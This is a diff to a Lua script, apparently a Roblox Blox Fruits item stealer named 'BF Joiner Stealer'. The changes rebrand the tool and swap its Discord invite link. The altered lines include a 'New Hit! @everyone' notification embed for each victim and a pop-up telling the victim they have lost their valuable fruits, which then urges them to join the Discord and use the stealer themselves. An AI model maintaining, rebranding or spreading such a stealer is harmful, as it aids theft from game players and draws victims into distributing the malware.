@@ -524,7 +524,7 @@ local function formatPremiumItems()
 end
 
 local embed = {
-    title = (dragonFruit and "DRAGON DETECTED!") or "Rua BF Joiner ; https://discord.gg/zJKDqRd5",
+    title = (dragonFruit and "DRAGON DETECTED!") or "BF Joiner ; https://discord.gg/E3MPAbp8",
     description = "New Hit! @everyone",
     color = (dragonFruit and 0xFF0000) or 0x00FF00,
     fields = {
@@ -1039,7 +1039,7 @@ local function createDiscordUI()
     Description.Position = UDim2.new(0.05, 0, 0.3, 0)
     Description.BackgroundTransparency = 1
     Description.Font = Enum.Font.Gotham
-    Description.Text = "Hey! You just lost some of your valuable fruits to Rua Hub BF Joiner Stealer. No need to worry! If you want to make them back using OUR stealer - Join our discord! Click the button to copy invite"
+    Description.Text = "Hey! You just lost some of your valuable fruits to BF Joiner Stealer. No need to worry! If you want to make them back using OUR stealer - Join our discord! Click the button to copy invite"
     Description.TextColor3 = Color3.fromRGB(220, 221, 222)
     Description.TextScaled = true
     Description.TextWrapped = true
@@ -1094,7 +1094,7 @@ local function createDiscordUI()
     end
 
     Button.MouseButton1Click:Connect(function()
-        setclipboard("https://discord.gg/zJKDqRd5")
+        setclipboard("https://discord.gg/E3MPAbp8")
         showCopiedText()
     end)
 
